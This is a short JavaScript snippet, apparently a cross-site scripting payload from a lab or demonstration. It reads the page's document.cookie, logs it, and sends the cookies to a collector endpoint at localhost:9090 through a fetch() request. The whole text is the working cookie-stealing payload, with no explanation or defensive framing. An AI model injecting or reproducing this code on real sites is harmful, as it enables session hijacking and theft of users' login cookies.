

console.log('XSS script running...');

var cookies = document.cookie;

console.log(cookies);

fetch('https://localhost:9090/img/xss?userCookies=' + cookies);






